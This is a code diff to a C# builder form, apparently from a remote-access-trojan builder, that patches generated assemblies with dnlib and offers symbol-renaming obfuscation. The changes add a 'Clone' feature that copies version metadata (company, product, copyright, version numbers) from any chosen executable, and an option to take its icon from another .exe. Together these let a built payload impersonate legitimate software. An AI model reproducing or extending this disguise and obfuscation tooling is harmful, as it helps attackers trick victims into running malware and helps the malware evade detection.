@@ -14,6 +14,7 @@ using dnlib.DotNet.Emit;
 using Server.RenamingObfuscation;
 using System.Threading.Tasks;
 using System.Diagnostics;
+using Toolbelt.Drawing;
 
 namespace Server.Forms
 {
@@ -203,7 +204,7 @@ namespace Server.Forms
                         if (chkObfu.Checked)
                         {
                             //EncryptString.DoEncrypt(asmDef);
-                           await Task.Run(() =>
+                            await Task.Run(() =>
                             {
                                 Renaming.DoRenaming(asmDef);
                             });
@@ -268,6 +269,7 @@ namespace Server.Forms
         {
             if (btnAssembly.Checked)
             {
+                btnClone.Enabled = true;
                 txtProduct.Enabled = true;
                 txtDescription.Enabled = true;
                 txtCompany.Enabled = true;
@@ -280,6 +282,7 @@ namespace Server.Forms
             }
             else
             {
+                btnClone.Enabled = false;
                 txtProduct.Enabled = false;
                 txtDescription.Enabled = false;
                 txtCompany.Enabled = false;
@@ -311,14 +314,38 @@ namespace Server.Forms
             using (OpenFileDialog ofd = new OpenFileDialog())
             {
                 ofd.Title = "Choose Icon";
-                ofd.Filter = "Icons *.ico|*.ico";
+                ofd.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                 ofd.Multiselect = false;
                 if (ofd.ShowDialog() == DialogResult.OK)
                 {
-                    txtIcon.Text = ofd.FileName;
-                    picIcon.ImageLocation = ofd.FileName;
+                    if (ofd.FileName.ToLower().EndsWith(".exe"))
+                    {
+                        string ico = GetIcon(ofd.FileName);
+                        txtIcon.Text = ico;
+                        picIcon.ImageLocation = ico;
+                    }
+                    else
+                    {
+                        txtIcon.Text = ofd.FileName;
+                        picIcon.ImageLocation = ofd.FileName;
+                    }
                 }
             }
+        }
+
+        private string GetIcon(string path)
+        {
+            try
+            {
+                string tempFile = Path.GetTempFileName() + ".ico";
+                using (FileStream fs = new FileStream(tempFile, FileMode.Create))
+                {
+                    IconExtractor.Extract1stIconTo(path, fs);
+                }
+                return tempFile;
+            }
+            catch { }
+            return "";
         }
 
         private void WriteSettings(ModuleDefMD asmDef)
@@ -442,5 +469,27 @@ namespace Server.Forms
             return sb.ToString();
         }
 
+        private void BtnClone_Click(object sender, EventArgs e)
+        {
+            using (var openFileDialog = new OpenFileDialog())
+            {
+                openFileDialog.Filter = "Executable (*.exe)|*.exe";
+                if (openFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
+
+                    txtOriginalFilename.Text = fileVersionInfo.InternalName ?? string.Empty;
+                    txtDescription.Text = fileVersionInfo.FileDescription ?? string.Empty;
+                    txtCompany.Text = fileVersionInfo.CompanyName ?? string.Empty;
+                    txtProduct.Text = fileVersionInfo.ProductName ?? string.Empty;
+                    txtCopyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
+                    txtTrademarks.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;
+
+                    var version = fileVersionInfo.FileMajorPart;
+                    txtFileVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
+                    txtProductVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
+                }
+            }
+        }
     }
 }
